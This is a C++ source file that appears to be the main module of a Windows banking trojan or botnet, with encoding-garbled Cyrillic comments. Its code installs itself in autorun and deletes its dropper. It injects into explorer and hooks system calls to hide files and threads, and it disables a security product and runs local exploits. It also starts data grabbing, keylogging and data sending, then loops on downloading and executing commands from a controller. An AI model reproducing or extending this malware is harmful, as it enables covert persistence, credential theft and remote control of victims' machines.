#include <windows.h>

#include "BotCore.h"
#include "DllLoader.h"

#include "Utils.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Config.h"
#include "Crypt.h"
#include "FtpSniffer.h"
#include "ntdll.h"
#include "BotEvents.h"
#include "Task.h"
#include "md5.h"
#include "BotDef.h"
#include "DbgRpt.h"
#include "Modules.h"
#include "BotDebug.h"



//********************** ���������� ������� **********************************

namespace MAINDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define MDBG MAINDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************


#pragma comment(linker, "/ENTRY:MyMain" )
//#pragma comment(linker, "/ENTRY:ExplorerMain" )



WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������
WCHAR FileToDelete[ MAX_PATH ]; //���� ��� �������� ��������������� ����� ����

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
//DWORD dwExplorerPid  = 0; //��� ����������

//����������� �����-��������, ������������ ��� �������������� ��������� ���� ����� ������
#define MAGIC "\0\0\0\0MAGIC_TEST"
char MagicValue[6144] = MAGIC;

//�������� ��� ����������


void InternalAddToAutorun()
{
	// ��������� ��������� � ������������
	// ������ � ������ ���� � ������� �� ��������������� �������
	// ��������������� �� �������� ��������� �������
	#ifndef DEBUGBOT
	if (!WSTR::IsEmpty(TempFileName))
	{
		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
		if (Mutex != NULL)
		{
				pCloseHandle(Mutex);
				MDBG("Main", "������ ����������. ���������� ���������� � ������������.");
				return;
		}

		MDBG("Main", "��������� ��� � ������������.");
		PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
		BOT::AddToAutoRun(Name);
		STR::Free(Name);
	}
	#endif

}

void DeleteDropper() // ������� �������, ������� ����
{
	
	if ( dwKillPid != 0 && !WSTR::IsEmpty(FileToDelete))
	{
		MDBG("Main", "������� ������");
		pWinStationTerminateProcess(NULL, dwKillPid, DBG_TERMINATE_PROCESS );	
		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
		pDeleteFileW(FileToDelete);
	}
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	BOT::Initialize();
	
	MDBG("Main", "*************** LoaderRoutine (PID:%d)", GetUniquePID());

	//UnhookDlls();

	BOT::Protect(NULL);

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// �������������� ������� �������� �������������� ����������
	DebugReportInit();

	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		// ������� ������� svchost
		pExitProcess(1);
	}

	// ��������� ��������������
	#ifdef BotAutoUpdateH
		StartAutoUpdate();
	#endif

	// �������� ����� �������� ������

	DataGrabber::StartDataSender();

	// �������� ����� ���������� ������ ��������� ���������
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	if (InitializeTaskManager(NULL, true))
	{
		MDBG("Main", "=====>> �������� ���������� ������");

		while (true)
		{

			DownloadAndExecuteCommand(NULL, NULL);

			// "������������" �������������� ����������� ���� � ��� �������
			// �������� ��������� ���������� ������ ���� ������ ����� ���������
			// �������
			if (!FirstSended)
			{
				MDBG("Main", "=====>> ���������� ���������� � �������");
				FirstSended = SendFirstInfo();
			}

			// ���������������� ���������� ������
			if (!TaskManagerSleep(NULL))
				break;
		}

    }
	return 0;
}


void ExplorerMain()
{
	MDBG("Main", "----------------- ExplorerMain -----------------");
	MDBG("Main", "WorkPath %s  WorkPathHash %d", BOT::GetWorkPathInSysDrive() ,BOT::GetWorkFolderHash());

	if ( !dwExplorerSelf )
		UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	InternalAddToAutorun();

	DeleteDropper();


	//----------------------------------------------------

	// ������� ������� ����������� ���� ��� ������������ ������ 
	// �������� �����������.
	BOT::TryCreateBotInstance();


	if ( !dwAlreadyRun )
		MegaJump( LoaderRoutine );
	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun )
			MegaJump( GrabberThread );
	#endif

	//MegaJump(AvFuckThread);
	
	// 
	HookZwResumeThread();
	HookZwQueryDirectoryFile();


	// �������� ������� ������ ����������

	if (dwFirst)
		ExplorerFirstStart(NULL);

	ExplorerStart(NULL);

}

DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	BOT::Initialize();

MDBG("Main", "E2");
	UnhookDlls();
	
	MDBG("Main", "E3");
	if (dwExplorerSelf) 
	{
		//���� ������ ��� � ���� ��������� �����������	

		dwExplorerSelf = 0;
	MDBG("Main", "E4");
		if (!InjectIntoExplorer(ExplorerRoutine))
		{
			MDBG("Main", "E5");
			ExplorerMain();
		}

		pExitProcess(1);
	}
	MDBG("Main", "E6");
	ExplorerMain();
	MDBG("Main", "E7");
	return 0;
}


int APIENTRY MyMain() 
{
	BOT::Initialize();

	// ��������� �� ������� �� �� ������ ���������� ������ ��������� ����
	if (BOT::IsRunning())
	{
		pMessageBoxA(NULL, "��� ��� �������", NULL, 0);
		pExitProcess(0);
		return 0; // �������� :)
	}


	DWORD* pVirtualAddr = (DWORD*)MagicValue;

	if ( *pVirtualAddr )
	{
		DWORD Old;
		PCHAR ImageBase = (PCHAR)GetImageBase();
		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)( (PCHAR)ImageBase + *pVirtualAddr);
		PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)( (PCHAR)pDos + pDos->e_lfanew);

		pVirtualProtect( ImageBase, pHeaders->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &Old );
		m_memcpy( ImageBase, pDos, pHeaders->OptionalHeader.SizeOfHeaders );
		pVirtualProtect( ImageBase, pHeaders->OptionalHeader.SizeOfHeaders, Old, &Old );
	}	


	MDBG("Main", "����������� ���. ������ ���� %s", BOT_VERSION);
	;

	#if defined(DEBUGBOT) && defined(DebugUtils)
		if (!StartInDebugingMode(true))
			return 0;
	#endif



	//UnhookDlls(); //������� ����

	WCHAR ModulePath[MAX_PATH];

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );

	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);

	MDBG("Main", "1");

	if ( dwProcessHash == BOT::GetBotExeNameHash()) // ������ �� ������ ����
	{
		KillOutpost();
		DWORD dwExploits = SetExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}
		}

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				MegaJump( LoaderRoutine );
			}
		}		
	}
	else
	{
		MDBG("Main", "2");
		dwFirst = 1;

		KillOutpost();
		MDBG("Main", "3");

		DWORD dwExploits = SetExploits();

		MDBG("Main", "4");

		if ( !dwExploits )
		{
			MDBG("Main", "5");
			if (MegaJump(LoaderRoutine))
			{
				dwAlreadyRun = 1;
			}

			#ifdef GrabberH
				if ( MegaJump( GrabberThread ) )
					dwGrabberRun = 1;
			#endif 
		}
		MDBG("Main", "6");		
		m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
		dwKillPid = (DWORD)pGetCurrentProcessId();
		CopyFileToTemp( ModulePath, TempFileName );	

		dwExplorerSelf = 1;
		MDBG("Main", "7");
		if (!JmpToExplorer(ExplorerRoutine ) )
		{
			MDBG("Main", "8");
			dwExplorerSelf = 0;

			InternalAddToAutorun();
		}
	}
	MDBG("Main", "9");
	pExitProcess(1);

	return 0;
}